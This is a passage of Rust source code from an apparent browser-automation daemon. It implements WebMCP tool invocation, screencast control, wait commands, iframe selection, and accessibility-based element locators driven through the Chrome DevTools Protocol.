    let tool = webmcp::resolve_tool(&tools, tool_name, frame_id)?;
    let (client, session_id, _) = webmcp_page_context(state).await?;
    let result = client
        .send_command(
            "WebMCP.invokeTool",
            Some(json!({
                "frameId": tool.frame_id,
                "toolName": tool.name,
                "input": input,
            })),
            Some(&session_id),
        )
        .await
        .map_err(|error| webmcp::invoke_error(&error))?;
    let invocation_id = result
        .get("invocationId")
        .and_then(Value::as_str)
        .ok_or("WebMCP.invokeTool response is missing invocationId")?
        .to_string();
    state.webmcp.insert(webmcp::InvocationRecord::pending(
        invocation_id.clone(),
        tool.name,
        tool.frame_id,
        tool.origin,
    ))?;

    if cmd.get("detach").and_then(Value::as_bool).unwrap_or(false) {
        return Ok(state.webmcp.invocations[&invocation_id].to_json());
    }
    wait_for_webmcp_invocation(state, &invocation_id, state.timeout_ms(cmd)).await
}

async fn handle_webmcp_result(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let invocation_id = cmd
        .get("invocationId")
        .and_then(Value::as_str)
        .ok_or("Missing 'invocationId' parameter")?;
    wait_for_webmcp_invocation(state, invocation_id, state.timeout_ms(cmd)).await
}

async fn handle_webmcp_cancel(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let invocation_id = cmd
        .get("invocationId")
        .and_then(Value::as_str)
        .ok_or("Missing 'invocationId' parameter")?;
    state.drain_cdp_events_background().await?;
    let record = state.webmcp.invocations.get(invocation_id).ok_or_else(|| {
        format!(
            "{}: Unknown WebMCP invocation '{}'",
            webmcp::ERR_INVOCATION_NOT_FOUND,
            invocation_id
        )
    })?;
    if record.is_terminal() {
        return Err(format!(
            "{}: WebMCP invocation '{}' is already {}",
            webmcp::ERR_INVOCATION_NOT_ACTIVE,
            invocation_id,
            record.status
        ));
    }
    let (client, session_id, _) = webmcp_page_context(state).await?;
    if let Err(error) = client
        .send_command(
            "WebMCP.cancelInvocation",
            Some(json!({ "invocationId": invocation_id })),
            Some(&session_id),
        )
        .await
    {
        state.drain_cdp_events_background().await?;
        if let Some(record) = state.webmcp.invocations.get(invocation_id) {
            if record.is_terminal() {
                return Ok(record.to_json());
            }
        }
        return Err(webmcp::cancel_error(&error));
    }
    wait_for_webmcp_invocation(state, invocation_id, state.timeout_ms(cmd)).await
}

// ---------------------------------------------------------------------------
// Screencast handlers
// ---------------------------------------------------------------------------

async fn handle_screencast_start(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    if state.screencasting {
        return Err("Screencast already active".to_string());
    }

    // Use stored viewport as default for screencast dimensions
    // Quality only. The frame-size env vars are deliberately not applied here:
    // this command reports its dimensions as the viewport in the status
    // broadcast, and clients scale pointer coordinates by that, so a smaller
    // encode would move every click.
    let env_cfg = stream::ScreencastConfig::from_env();
    let (default_w, default_h) = if let Some(ref server) = state.stream_server {
        server.viewport().await
    } else {
        (1280, 720)
    };
    let format = cmd.get("format").and_then(|v| v.as_str()).unwrap_or("jpeg");
    let quality = cmd
        .get("quality")
        .and_then(|v| v.as_i64())
        .map(|q| q as i32)
        .unwrap_or(env_cfg.quality);
    let max_width = cmd
        .get("maxWidth")
        .and_then(|v| v.as_i64())
        .unwrap_or(default_w as i64) as i32;
    let max_height = cmd
        .get("maxHeight")
        .and_then(|v| v.as_i64())
        .unwrap_or(default_h as i64) as i32;

    stream::start_screencast(
        &mgr.client,
        &session_id,
        format,
        quality,
        max_width,
        max_height,
    )
    .await?;
    state.screencasting = true;

    if let Some(ref server) = state.stream_server {
        server.set_screencasting(true).await;
        server
            .broadcast_status(
                true,
                true,
                max_width as u32,
                max_height as u32,
                &state.engine,
            )
            .await;
    }

    Ok(json!({ "started": true }))
}

async fn handle_screencast_stop(state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?;

    if !state.screencasting {
        return Err("No screencast active".to_string());
    }

    stream::stop_screencast(&mgr.client, session_id).await?;
    state.screencasting = false;

    if let Some(ref server) = state.stream_server {
        server.set_screencasting(false).await;
        let (vw, vh) = server.viewport().await;
        server
            .broadcast_status(true, false, vw, vh, &state.engine)
            .await;
    }

    Ok(json!({ "stopped": true }))
}

// ---------------------------------------------------------------------------
// Wait variant handlers
// ---------------------------------------------------------------------------

async fn handle_waitforurl(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let url_pattern = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url' parameter")?;
    let timeout_ms = state.timeout_ms(cmd);

    wait_for_url(mgr, url_pattern, timeout_ms).await?;
    let url = mgr.get_url().await.unwrap_or_default();
    Ok(json!({ "url": url }))
}

/// Wait for a page lifecycle state and return an error when its timeout expires.
async fn handle_waitforloadstate(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let load_state = cmd.get("state").and_then(|v| v.as_str()).unwrap_or("load");
    let timeout_ms = state.timeout_ms(cmd);

    let wait_until = WaitUntil::from_str(load_state);
    mgr.wait_for_lifecycle_external(wait_until, &session_id, timeout_ms)
        .await?;

    Ok(json!({ "state": load_state }))
}

async fn handle_waitforfunction(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let expression = cmd
        .get("expression")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'expression' parameter")?;
    let timeout_ms = state.timeout_ms(cmd);

    wait_for_function(&mgr.client, &session_id, expression, timeout_ms).await?;

    let result: super::cdp::types::EvaluateResult = mgr
        .client
        .send_command_typed(
            "Runtime.evaluate",
            &super::cdp::types::EvaluateParams {
                expression: format!("({})", expression),
                return_by_value: Some(true),
                await_promise: Some(true),
            },
            Some(&session_id),
        )
        .await?;

    Ok(json!({ "result": result.result.value.unwrap_or(Value::Null) }))
}

// ---------------------------------------------------------------------------
// Frame handlers
// ---------------------------------------------------------------------------

async fn handle_frame(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let selector = cmd.get("selector").and_then(|v| v.as_str());
    let name = cmd.get("name").and_then(|v| v.as_str());
    let url = cmd.get("url").and_then(|v| v.as_str());

    if selector.is_none() && name.is_none() && url.is_none() {
        return Err("At least one of 'selector', 'name', or 'url' is required".to_string());
    }

    let tree_result = mgr
        .client
        .send_command_no_params("Page.getFrameTree", Some(&session_id))
        .await?;

    fn find_frame(tree: &Value, name: Option<&str>, url: Option<&str>) -> Option<String> {
        let frame = tree.get("frame")?;
        let frame_name = frame.get("name").and_then(|v| v.as_str()).unwrap_or("");
        let frame_url = frame.get("url").and_then(|v| v.as_str()).unwrap_or("");
        let frame_id = frame.get("id").and_then(|v| v.as_str())?;

        if let Some(n) = name {
            if frame_name == n {
                return Some(frame_id.to_string());
            }
        }
        if let Some(u) = url {
            if frame_url.contains(u) {
                return Some(frame_id.to_string());
            }
        }

        if let Some(children) = tree.get("childFrames").and_then(|v| v.as_array()) {
            for child in children {
                if let Some(id) = find_frame(child, name, url) {
                    return Some(id);
                }
            }
        }
        None
    }

    let frame_tree = &tree_result["frameTree"];

    // If selector is a ref (@e1), resolve the iframe element from the ref map
    if let Some(sel) = selector {
        if let Some(ref_id) = super::element::parse_ref(sel) {
            let entry = state
                .ref_map
                .get(&ref_id)
                .ok_or_else(|| format!("Unknown ref: {}", ref_id))?;
            let backend_node_id = entry
                .backend_node_id
                .ok_or_else(|| format!("Ref {} has no backend node id", ref_id))?;

            // Use DOM.describeNode to resolve the child frame ID directly.
            // This works reliably for all iframes, including those without
            // name, id, or src attributes.
            let describe: Value = mgr
                .client
                .send_command(
                    "DOM.describeNode",
                    Some(json!({ "backendNodeId": backend_node_id, "depth": 1 })),
                    Some(&session_id),
                )
                .await?;

            // Verify this is an iframe/frame element
            let node_name = describe
                .get("node")
                .and_then(|n| n.get("nodeName"))
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if node_name != "IFRAME" && node_name != "FRAME" {
                return Err("Ref does not point to an iframe element".to_string());
            }

            // Try contentDocument.frameId first (standard for iframes)
            let frame_id = describe
                .get("node")
                .and_then(|n| n.get("contentDocument"))
                .and_then(|cd| cd.get("frameId"))
                .and_then(|v| v.as_str())
                // Fallback: the node itself may carry a frameId
                .or_else(|| {
                    describe
                        .get("node")
                        .and_then(|n| n.get("frameId"))
                        .and_then(|v| v.as_str())
                })
                .ok_or("Could not resolve frame ID for iframe element")?;

            let label = describe
                .get("node")
                .and_then(|n| n.get("attributes"))
                .and_then(|a| a.as_array())
                .and_then(|attrs| {
                    attrs
                        .iter()
                        .enumerate()
                        .find(|(_, v)| v.as_str() == Some("name"))
                        .and_then(|(i, _)| attrs.get(i + 1))
                        .and_then(|v| v.as_str())
                })
                .unwrap_or(&ref_id);

            state.active_frame_id = Some(frame_id.to_string());
            return Ok(json!({ "frame": label }));
        }

        // CSS selector path
        let js = format!(
            r#"(() => {{
                const el = document.querySelector({});
                if (!el) return null;
                if (el.tagName === 'IFRAME' || el.tagName === 'FRAME') {{
                    return el.name || el.id || el.src || null;
                }}
                return null;
            }})()"#,
            serde_json::to_string(sel).unwrap_or_default()
        );
        let result = mgr.evaluate(&js, None).await?;
        let frame_name = result.as_str().ok_or("Could not find frame for selector")?;
        if let Some(frame_id) = find_frame(frame_tree, Some(frame_name), None) {
            state.active_frame_id = Some(frame_id);
            return Ok(json!({ "frame": frame_name }));
        }
    }

    if let Some(frame_id) = find_frame(frame_tree, name, url) {
        let label = name.or(url).unwrap_or("frame");
        state.active_frame_id = Some(frame_id);
        return Ok(json!({ "frame": label }));
    }

    Err("Frame not found".to_string())
}

async fn handle_mainframe(state: &mut DaemonState) -> Result<Value, String> {
    state.active_frame_id = None;
    Ok(json!({ "frame": "main" }))
}

// ---------------------------------------------------------------------------
// Semantic locator handlers
// ---------------------------------------------------------------------------

/// The exact set of `find` actions `execute_subaction` dispatches. Shared by
/// the validation guard, the error message, and the accepted-actions test,
/// so drift between the guard and the match arms fails a test instead of
/// silently reopening the "Unknown subaction: type" bug this fixes.
pub(crate) const FIND_ACTIONS: &[&str] = &["click", "fill", "check", "hover", "text"];

/// The daemon commands that dispatch a `find` subaction through
/// `execute_subaction` after resolving their locator.
const FIND_SUBACTION_COMMANDS: &[&str] = &[
    "getbyrole",
    "getbytext",
    "getbylabel",
    "getbyplaceholder",
    "getbyalttext",
    "getbytitle",
    "getbytestid",
    "nth",
];

/// Reject an unsupported `find` action before any browser launch or locator
/// resolution. The guard inside `execute_subaction` only runs after both, so
/// on a missing element it never runs at all: the caller fails first with an
/// "element not found" error that names the wrong fault, after paying for a
/// browser launch to say it. Validation order follows the input, not the
/// setup cost.
fn validate_find_subaction(action: &str, cmd: &Value) -> Result<(), String> {
    if !FIND_SUBACTION_COMMANDS.contains(&action) {
        return Ok(());
    }
    let subaction = cmd
        .get("subaction")
        .and_then(|v| v.as_str())
        .unwrap_or("click");
    if !FIND_ACTIONS.contains(&subaction) {
        return Err(format!(
            "Unknown action '{}' for find. Valid actions: {}.",
            subaction,
            FIND_ACTIONS.join(", ")
        ));
    }
    Ok(())
}

async fn execute_subaction(
    cmd: &Value,
    state: &mut DaemonState,
    selector: &str,
) -> Result<Value, String> {
    let subaction = cmd
        .get("subaction")
        .and_then(|v| v.as_str())
        .unwrap_or("click");

    // Validate before dispatching: an unsupported action (e.g. "type",
    // "focus", "uncheck", all real standalone commands, just not `find`
    // actions) gets a message naming the valid set here.
    if !FIND_ACTIONS.contains(&subaction) {
        return Err(format!(
            "Unknown action '{}' for find. Valid actions: {}.",
            subaction,
            FIND_ACTIONS.join(", ")
        ));
    }

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    match subaction {
        "click" => {
            let result = interaction::click(
                &mgr.client,
                &session_id,
                &state.ref_map,
                selector,
                "left",
                1,
                &state.iframe_sessions,
            )
            .await?;
            record_click_animation(
                &result,
                &mut state.mouse_state,
                &state.recording_state.shared_cursor,
            );
            if result.dialog_opened {
                state.pending_pointer_release = result.pending_release;
                return Ok(json!({ "clicked": selector, "dialogOpened": true }));
            }
            Ok(json!({ "clicked": selector }))
        }
        "fill" => {
            let value = cmd
                .get("value")
                .and_then(|v| v.as_str())
                .ok_or("Missing 'value' for fill subaction")?;
            interaction::fill(
                &mgr.client,
                &session_id,
                &state.ref_map,
                selector,
                value,
                &state.iframe_sessions,
            )
            .await?;
            Ok(json!({ "filled": selector }))
        }
        "check" => {
            if let Some(position) = interaction::check(
                &mgr.client,
                &session_id,
                &state.ref_map,
                selector,
                &state.iframe_sessions,
            )
            .await?
            {
                (state.mouse_state.x, state.mouse_state.y) = position;
                if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
                    cursor.record(position.0, position.1, state.mouse_state.buttons);
                }
            }
            Ok(json!({ "checked": selector }))
        }
        "hover" => {
            let position = interaction::hover(
                &mgr.client,
                &session_id,
                &state.ref_map,
                selector,
                &state.iframe_sessions,
            )
            .await?;
            (state.mouse_state.x, state.mouse_state.y) = position;
            if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
                cursor.record(position.0, position.1, state.mouse_state.buttons);
            }
            Ok(json!({ "hovered": selector }))
        }
        "text" => {
            let text = super::element::get_element_text(
                &mgr.client,
                &session_id,
                &state.ref_map,
                selector,
                &state.iframe_sessions,
            )
            .await?;
            Ok(json!({ "text": text }))
        }
        // Unreachable today; a real Err rather than unreachable!() in case
        // this ever drifts out of sync with the guard above.
        _ => Err(format!(
            "Internal error: action '{}' passed validation but has no handler.",
            subaction
        )),
    }
}

fn build_role_selector(role: &str, name: Option<&str>, exact: bool) -> String {
    match name {
        Some(n) => {
            let exact_str = if exact { ", exact: true" } else { "" };
            format!("getByRole('{}', {{ name: '{}'{} }})", role, n, exact_str)
        }
        None => format!("getByRole('{}')", role),
    }
}

/// role="none" and role="presentation" (ARIA synonyms) exist to strip an
/// element's semantics, so Chrome prunes such elements from the AX tree
/// entirely (divs, lists, imgs) or keeps them only as ignored nodes
/// (tables). The accessibility tree can never answer a query for them.
fn is_presentational_role(role: &str) -> bool {
    role.eq_ignore_ascii_case("none") || role.eq_ignore_ascii_case("presentation")
}

/// Match presentational roles against the explicit `role` attribute in the
/// DOM, the only place the author's intent survives (see
/// `is_presentational_role`). ARIA treats the role attribute as an ordered
/// fallback list whose first supported token is the operative role, so
/// `role="button none"` is a button and must not answer a query for "none",
/// while `role="none button"` must. Matching is literal per synonym: a query
/// for "none" only matches an operative "none", mirroring Playwright's
/// literal role comparison. Name matching approximates accessible-name
/// precedence (aria-labelledby, then aria-label, then text content) with
/// whitespace normalized; non-exact is a case-insensitive substring check,
/// exact is a case-sensitive whole-name comparison.
async fn handle_presentational_getbyrole(
    cmd: &Value,
    state: &mut DaemonState,
    role: &str,
    name: Option<&str>,
    exact: bool,
) -> Result<Value, String> {
    let name_check = match name {
        Some(n) => {
            let name_json = serde_json::to_string(n).unwrap_or_default();
            if exact {
                format!("if (norm(nameOf(el)) !== norm({name_json})) continue;")
            } else {
                format!(
                    "if (!norm(nameOf(el)).toLowerCase().includes(norm({name_json}).toLowerCase())) continue;"
                )
            }
        }
        None => String::new(),
    };

    let role_json = serde_json::to_string(&role.to_ascii_lowercase()).unwrap_or_default();
    // ARIA roles Playwright recognizes (WAI-ARIA 1.2). The operative role is the
    // first token that is a defined role, so omitting one (e.g. `mark`) lets a
    // later presentational token wrongly win.
    // A function of `root` (the document to search), so it can run against the
    // top document or a selected frame's document, not just the global one.
    let locate_body = format!(
        r#"(root) => {{
            const VALID_ROLES = new Set(['alert','alertdialog','application','article','banner','blockquote','button','caption','cell','checkbox','code','columnheader','combobox','complementary','contentinfo','definition','deletion','dialog','directory','document','emphasis','feed','figure','form','generic','grid','gridcell','group','heading','img','insertion','link','list','listbox','listitem','log','main','mark','marquee','math','meter','menu','menubar','menuitem','menuitemcheckbox','menuitemradio','navigation','none','note','option','paragraph','presentation','progressbar','radio','radiogroup','region','row','rowgroup','rowheader','scrollbar','search','searchbox','separator','slider','spinbutton','status','strong','subscript','superscript','switch','tab','table','tablist','tabpanel','term','textbox','time','timer','toolbar','tooltip','tree','treegrid','treeitem']);
            const norm = s => (s || '').replace(/\s+/g, ' ').trim();
            const nameOf = el => {{
                const lb = el.getAttribute('aria-labelledby');
                if (lb) {{
                    const t = lb.trim().split(/\s+/)
                        .map(id => {{ const r = root.getElementById(id); return r ? r.textContent : ''; }})
                        .join(' ');
                    if (norm(t)) return t;
                }}
                const al = el.getAttribute('aria-label');
                if (al !== null && norm(al)) return al;
                return el.textContent || '';
            }};
            const role = {role_json};
            const isPresentational = role === 'none' || role === 'presentation';
            // Global ARIA states/properties (WAI-ARIA 1.2); their presence, not any
            // aria-* attribute, triggers presentational-roles conflict resolution.
            const GLOBAL_ARIA = new Set(['aria-atomic','aria-busy','aria-controls','aria-current','aria-describedby','aria-description','aria-details','aria-disabled','aria-dropeffect','aria-errormessage','aria-flowto','aria-grabbed','aria-haspopup','aria-hidden','aria-invalid','aria-keyshortcuts','aria-label','aria-labelledby','aria-live','aria-owns','aria-relevant','aria-roledescription']);
            const isFocusable = el => el.tabIndex >= 0 || el.hasAttribute('tabindex');
            for (const el of root.querySelectorAll('[role]')) {{
                const tokens = (el.getAttribute('role') || '').trim().toLowerCase().split(/\s+/);
                const operative = tokens.find(t => VALID_ROLES.has(t));
                if (operative !== role) continue;
                // ARIA presentational-roles conflict resolution: none/presentation
                // is ignored on a focusable element or one carrying global ARIA
                // states/properties, so it keeps its implicit role and must not
                // answer a query for none/presentation.
                if (isPresentational && (isFocusable(el) || el.getAttributeNames().some(a => GLOBAL_ARIA.has(a)))) continue;
                {name_check}
                el.setAttribute('data-agent-browser-located', 'true');
                return true;
            }}
            return false;
        }}"#
    );

    let located = {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        let top_session = mgr.active_session_id()?.to_string();
        eval_body_in_active_frame(
            mgr,
            state.active_frame_id.as_deref(),
            &top_session,
            &state.iframe_sessions,
            &locate_body,
        )
        .await?
    };

    if !located.as_bool().unwrap_or(false) {
        return Err(format!(
            "No element found: {}",
            build_role_selector(role, name, exact)
        ));
    }

    let selector = "[data-agent-browser-located='true']";
    let action_result = execute_subaction(cmd, state, selector).await;

    // Clean up the marker in whichever document it was set in.
    if let Some(mgr) = state.browser.as_ref() {
        if let Ok(top_session) = mgr.active_session_id() {
            let top_session = top_session.to_string();
            let _ = eval_body_in_active_frame(
                mgr,
                state.active_frame_id.as_deref(),
                &top_session,
                &state.iframe_sessions,
                "(root) => { root.querySelector('[data-agent-browser-located]')?.removeAttribute('data-agent-browser-located'); }",
            )
            .await;
        }
    }

    action_result
}

/// Evaluate a `(root) => {...}` body against the active frame's document, or the
/// top document when no frame is selected. Runtime.evaluate cannot target a
/// same-origin child frame, so that case runs the body against the frame owner's
/// contentDocument (as element resolution does); an OOPIF has its own session
/// where `document` is already the frame document.
async fn eval_body_in_active_frame(
    mgr: &BrowserManager,
    frame_id: Option<&str>,
    top_session: &str,
    iframe_sessions: &HashMap<String, String>,
    body: &str,
) -> Result<Value, String> {
    match frame_id {
        Some(fid) if !iframe_sessions.contains_key(fid) => {
            let owner =
                super::element::frame_owner_object_id(&mgr.client, top_session, fid).await?;
            let func = format!(
                "function() {{ const d = this.contentDocument; if (!d) return null; return ({body})(d); }}"
            );
            let res = mgr
                .client
                .send_command(
                    "Runtime.callFunctionOn",
                    Some(serde_json::json!({
                        "objectId": owner,
                        "functionDeclaration": func,
                        "returnByValue": true,
                    })),
                    Some(top_session),
                )
                .await?;
            Ok(res
                .get("result")
                .and_then(|r| r.get("value"))
                .cloned()
                .unwrap_or(Value::Null))
        }
        _ => {
            let session = frame_id
                .and_then(|f| iframe_sessions.get(f))
                .map(|s| s.as_str())
                .unwrap_or(top_session);
            let res: super::cdp::types::EvaluateResult = mgr
                .client
                .send_command_typed(
                    "Runtime.evaluate",
                    &super::cdp::types::EvaluateParams {
                        expression: format!("({body})(document)"),
                        return_by_value: Some(true),
                        await_promise: Some(false),
                    },
                    Some(session),
                )
                .await?;
            Ok(res.result.value.unwrap_or(Value::Null))
        }
    }
}

async fn handle_getbyrole(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let role = cmd
        .get("role")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'role' parameter")?;
    let name = cmd.get("name").and_then(|v| v.as_str());
    let exact = cmd.get("exact").and_then(|v| v.as_bool()).unwrap_or(false);

    // The AX tree cannot answer these, so they fall back to a DOM match on the
    // explicit `role` attribute: none/presentation are pruned from the tree, and
    // Chrome collapses `directory` into `list` (only the attribute tells them apart).
    if is_presentational_role(role) || role.eq_ignore_ascii_case("directory") {
        return handle_presentational_getbyrole(cmd, state, role, name, exact).await;
    }

    // Query the accessibility tree via CDP: the browser engine is the
    // authoritative source for implicit roles (e.g. <h2> -> "heading",
    // <a href> -> "link"), which a CSS selector cannot approximate.
    let (ax_params, effective_session_id) = super::element::resolve_ax_session(
        state.active_frame_id.as_deref(),
        &session_id,
        &state.iframe_sessions,
    );

    let ax_tree: GetFullAXTreeResult = mgr
        .client
        .send_command_typed_raw(
            "Accessibility.getFullAXTree",
            &ax_params,
            Some(effective_session_id),
        )
        .await?;

    let (backend_node_id, actual_name) = find_ax_node_by_role(&ax_tree.nodes, role, name, exact)?;

    let ref_num = state.ref_map.next_ref_num();
    let temp_ref = format!("e{}", ref_num);
    state.ref_map.add_with_frame(
        temp_ref.clone(),
        Some(backend_node_id),
        role,
        &actual_name,
        None,
        state.active_frame_id.as_deref(),
    );
    state.ref_map.set_next_ref_num(ref_num + 1);

    let result = execute_subaction(cmd, state, &format!("@{}", temp_ref)).await;
    state.ref_map.remove(&temp_ref);
    result
}

/// Map a Chrome AX tree role to its ARIA name. Divergences: `image` -> `img`
/// and `RootWebArea` -> `document` (Chrome's names for what ARIA/Playwright call
/// `img` and `document`); queries pass through the same table so both spellings
/// match. `directory` is not mapped here (Chrome collapses it into `list`); it is
/// matched on the DOM attribute instead, see handle_getbyrole.
fn normalize_ax_role(role: &str) -> String {
    let lower = role.to_ascii_lowercase();
    match lower.as_str() {
        "image" => "img".to_string(),
        "rootwebarea" => "document".to_string(),
        _ => lower,
    }
}

/// Collapse internal whitespace runs to single spaces and trim, mirroring
/// Playwright's accessible-name normalization: `"Save   changes"` and
/// `"Save changes"` are the same accessible name.
fn normalize_ws(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Match a role and (optional) accessible name against the AX tree, mirroring
/// Playwright's getByRole semantics: role values are compared case-insensitively
/// after AX-to-ARIA normalization; accessible names are whitespace-normalized on
/// both sides, then non-exact matching is a case-insensitive substring check and
/// exact matching is a case-sensitive whole-name comparison. Continues past AX
/// nodes without a backendDOMNodeId (virtual nodes) so a later actionable match
/// still wins.
fn find_ax_node_by_role(
    nodes: &[super::cdp::types::AXNode],
    role: &str,
    name: Option<&str>,
    exact: bool,
) -> Result<(i64, String), String> {
    let mut matched_without_backend_id = false;
    // `names_seen` keeps first-seen order for the error message; `names_set` makes
    // the dedup check O(1) so a failed name query is linear, not quadratic, in the
    // number of role matches.
    let mut names_seen: Vec<String> = Vec::new();
    let mut names_set: HashSet<String> = HashSet::new();
    let mut role_match_count: usize = 0;
    let target_role = normalize_ax_role(role);

    for node in nodes {
        if node.ignored.unwrap_or(false) {
            continue;
        }

        let node_role = super::element::extract_ax_string(&node.role);
        if normalize_ax_role(&node_role) != target_role {
            continue;
        }

        let node_name = super::element::extract_ax_string(&node.name);
        let matches = match name {
            Some(target_name) if exact => normalize_ws(&node_name) == normalize_ws(target_name),
            Some(target_name) => normalize_ws(&node_name)
                .to_lowercase()
                .contains(&normalize_ws(target_name).to_lowercase()),
            None => true,
        };

        if !matches {
            if name.is_some() {
                role_match_count += 1;
                if names_set.insert(node_name.clone()) {
                    names_seen.push(node_name);
                }
            }
            continue;
        }

        if let Some(id) = node.backend_d_o_m_node_id {
            return Ok((id, node_name));
        }

        matched_without_backend_id = true;
    }

    if matched_without_backend_id {
        return Err(match name {
            Some(target_name) => format!(
                "Found role \"{}\" matching name \"{}\" in the accessibility tree, but it has no live DOM element to act on.",
                role, target_name
            ),
            None => format!(
                "Found role \"{}\" in the accessibility tree, but it has no live DOM element to act on.",
                role
            ),
        });
    }

    // A role match with no name match is more actionable than a blanket
    // "not found": show what the query actually saw, so an agent can fix a
    // typo'd name without a blind retry.
    if let Some(target_name) = name {
        if !names_seen.is_empty() {
            let shown: Vec<String> = names_seen
                .iter()
                .take(5)
                .map(|n| format!("\"{}\"", n))
                .collect();
            let more = if names_seen.len() > 5 { ", ..." } else { "" };
            let (plural, verb) = if role_match_count == 1 {
                ("", "has")
            } else {
                ("s", "have")
            };
            return Err(format!(
                "{count} element{plural} {verb} role \"{role}\", but none match name \"{target_name}\". Names seen: {shown}{more}",
                count = role_match_count,
                plural = plural,
                verb = verb,
                role = role,
                target_name = target_name,
                shown = shown.join(", "),
                more = more,
            ));
        }
    }

    let desc = build_role_selector(role, name, exact);
    Err(format!("No element found: {}", desc))
}

async fn handle_semantic_locator(
    cmd: &Value,
    state: &mut DaemonState,
    strategy: &str,
    param_name: &str,
) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let value = cmd
        .get(param_name)
        .and_then(|v| v.as_str())
        .ok_or(format!("Missing '{}' parameter", param_name))?;
    let exact = cmd.get("exact").and_then(|v| v.as_bool()).unwrap_or(false);

    let match_fn = if exact {
        format!(
            "el.textContent.trim() === {}",
            serde_json::to_string(value).unwrap_or_default()
        )
    } else {
        format!(
            "el.textContent.includes({})",
            serde_json::to_string(value).unwrap_or_default()
        )
    };

    let query = match strategy {
        // Like Playwright's getByLabel: match <label> associations AND
        // aria-label / aria-labelledby. Icon buttons and custom controls
        // are usually labelled via aria-label only.
        "label" => {
            let value_json = serde_json::to_string(value).unwrap_or_default();
            let matches_fn = if exact {
                format!("(s) => !!s && s.trim() === {value_json}")
            } else {
                format!("(s) => !!s && s.includes({value_json})")
            };
            format!(
                r#"(() => {{
                const matches = {matches_fn};
                const label = Array.from(document.querySelectorAll('label')).find(el => matches(el.textContent));
                if (label) {{
                    const forId = label.getAttribute('for');
                    const target = forId ? document.getElementById(forId) : label.querySelector('input,select,textarea');
                    if (target) {{ target.setAttribute('data-agent-browser-located', 'true'); return true; }}
                }}
                const aria = Array.from(document.querySelectorAll('[aria-label]')).find(el => matches(el.getAttribute('aria-label')));
                if (aria) {{ aria.setAttribute('data-agent-browser-located', 'true'); return true; }}
                const referenced = Array.from(document.querySelectorAll('[aria-labelledby]')).find(el => {{
                    const text = el.getAttribute('aria-labelledby').split(/\s+/)
                        .map(id => {{ const r = document.getElementById(id); return r ? r.textContent : ''; }})
                        .join(' ');
                    return matches(text);
                }});
                if (referenced) {{ referenced.setAttribute('data-agent-browser-located', 'true'); return true; }}
                return false;
            }})()"#,
            )
        }
        "placeholder" => format!(
            r#"(() => {{
                const el = document.querySelector('input[placeholder={val}], textarea[placeholder={val}]');
                if (el) {{ el.setAttribute('data-agent-browser-located', 'true'); return true; }}
                return false;
            }})()"#,
            val = serde_json::to_string(value).unwrap_or_default(),
        ),
        "alttext" => format!(
            r#"(() => {{
                const el = document.querySelector('img[alt={val}], [alt={val}]');
                if (el) {{ el.setAttribute('data-agent-browser-located', 'true'); return true; }}
                return false;
            }})()"#,
            val = serde_json::to_string(value).unwrap_or_default(),
        ),
        "title" => format!(
            r#"(() => {{
                const el = document.querySelector('[title={val}]');
                if (el) {{ el.setAttribute('data-agent-browser-located', 'true'); return true; }}
                return false;
            }})()"#,
            val = serde_json::to_string(value).unwrap_or_default(),
        ),
        "testid" => format!(
            r#"(() => {{
                const el = document.querySelector('[data-testid={val}]');
                if (el) {{ el.setAttribute('data-agent-browser-located', 'true'); return true; }}
                return false;
            }})()"#,
            val = serde_json::to_string(value).unwrap_or_default(),
        ),
        _ => {
            // "text" strategy
            format!(
                r#"(() => {{
                    const all = document.querySelectorAll('*');
                    for (const el of all) {{
                        if (el.children.length === 0 && {match_fn}) {{
                            el.setAttribute('data-agent-browser-located', 'true');
                            return true;
                        }}
                    }}
                    return false;
                }})()"#,
                match_fn = match_fn,
            )
        }
    };

    let result: super::cdp::types::EvaluateResult = mgr
        .client
        .send_command_typed(
            "Runtime.evaluate",
            &super::cdp::types::EvaluateParams {
                expression: query,
                return_by_value: Some(true),
                await_promise: Some(false),
            },
            Some(&session_id),
        )
        .await?;

    if !result
        .result
        .value
        .as_ref()
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        return Err(format!("No element found by {} '{}'", strategy, value));
    }

    let selector = "[data-agent-browser-located='true']";
    let action_result = execute_subaction(cmd, state, selector).await;

    if let Some(ref browser) = state.browser {
        let _ = browser
            .evaluate(
                "document.querySelector('[data-agent-browser-located]')?.removeAttribute('data-agent-browser-located')",
                None,
            )
            .await;
    }

    action_result
}

async fn handle_getbytext(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    handle_semantic_locator(cmd, state, "text", "text").await
}

async fn handle_getbylabel(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    handle_semantic_locator(cmd, state, "label", "label").await
}

